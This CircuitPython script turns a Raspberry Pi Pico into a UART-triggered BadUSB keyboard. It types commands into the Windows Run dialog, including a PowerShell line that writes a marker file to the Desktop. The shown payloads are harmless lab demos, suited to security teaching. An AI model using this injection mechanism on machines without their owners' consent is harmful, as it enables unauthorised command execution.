# BLAZE BadUSB - Raspberry Pi Pico / CircuitPython HID endpoint
#
# Wiring:
#   Pico GP1 (UART RX) <- BLAZE D4 / GPIO2 (UART1 TX)
#   Pico GP2 (ACK out) -> BLAZE D0 / GPIO16 (input, pull-down)
#   GND                --  GND
#
# Protocol: '1' NORMAL, '2' CRITICAL, '0' stop, '?' ping.
# Payloads are intentionally non-destructive lab demos.

import time

import board
import busio
import digitalio
import usb_hid

from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

uart = busio.UART(tx=board.GP0, rx=board.GP1, baudrate=9600, timeout=0.05)

ack = digitalio.DigitalInOut(board.GP2)
ack.direction = digitalio.Direction.OUTPUT
ack.value = True  # alive

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

abort = False


def pulse():
    ack.value = False
    time.sleep(0.06)
    ack.value = True


def pump():
    """Read UART between typed chunks so '0' can abort a long payload."""
    global abort
    data = uart.read(1)
    if not data:
        return
    c = data[0]
    if c == ord("0"):
        abort = True
        pulse()


def type_text(text, chunk=16, gap=0.03):
    global abort
    if abort:
        return
    for i in range(0, len(text), chunk):
        if abort:
            return
        layout.write(text[i:i + chunk])
        time.sleep(gap)
        pump()


def tap(*keys):
    kbd.press(*keys)
    kbd.release_all()
    time.sleep(0.08)


def run_dialog(command):
    tap(Keycode.WINDOWS, Keycode.R)
    time.sleep(0.7)
    type_text(command, chunk=12, gap=0.02)
    tap(Keycode.ENTER)


def normal():
    """Harmless: open Notepad and type a banner."""
    run_dialog("notepad")
    time.sleep(1.0)
    type_text(
        "BLAZE // DARK\n"
        "BadUSB link OK.\n"
        "This is a harmless lab payload.\n",
        chunk=12,
        gap=0.02,
    )


def critical():
    """Non-destructive lab demo: marker file + Notepad proof."""
    cmd = (
        "powershell -NoP -C \""
        "$p=$env:USERPROFILE+'\\Desktop\\BLAZE.txt';"
        "'BLAZE WAS HERE // '+(Get-Date) | Out-File $p;"
        "notepad $p\""
    )
    run_dialog(cmd)
    time.sleep(0.8)


while True:
    data = uart.read(1)
    if not data:
        continue

    c = data[0]
    abort = False

    if c == ord("1"):
        pulse()
        normal()
    elif c == ord("2"):
        pulse()
        critical()
    elif c == ord("0"):
        pulse()
    elif c == ord("?"):
        pulse()
